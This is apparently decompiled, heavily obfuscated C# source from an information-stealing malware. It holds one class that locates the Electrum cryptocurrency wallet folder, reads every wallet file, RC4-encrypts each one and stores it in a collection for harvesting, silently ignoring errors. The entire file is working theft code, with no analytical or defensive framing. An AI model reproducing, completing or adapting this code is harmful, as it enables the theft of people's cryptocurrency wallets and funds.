using System;
using System.IO;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000067 RID: 103
	internal class Class_79
	{
		// Token: 0x060001E5 RID: 485 RVA: 0x000106E4 File Offset: 0x0000E8E4
		public static void lmethod_238(string str_0)
		{
			try
			{
				if (Directory.Exists(Class_79.field_1))
				{
					foreach (string path in Directory.GetFiles(Class_79.field_1))
					{
						Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + Class_79.field_2 + Path.GetFileName(path), Class_47.RC4(File.ReadAllBytes(path)));
					}
					Class_79.field_0++;
					Class_54.field_0++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000136 RID: 310
		public static int field_0;

		// Token: 0x04000137 RID: 311
		public static string field_1 = Class_47.\u030A\u0330\u0314\u0E47\u036D\u0020\u0331\u036B\u0310\u0341\u0353\u0333\u035F\u0368\u0333\u0369fscvyixozutspogr\u0316\u0020\u0E47\u0340\u0020\u0325\u035A\u0342\u032F\u0366\u0303\u036D\u0344\u0302\u0338\u032Cmiwjanndutheeold + "\\Electrum\\wallets";

		// Token: 0x04000138 RID: 312
		public static string field_2 = "\\Wallets\\Electrum\\";
	}
}
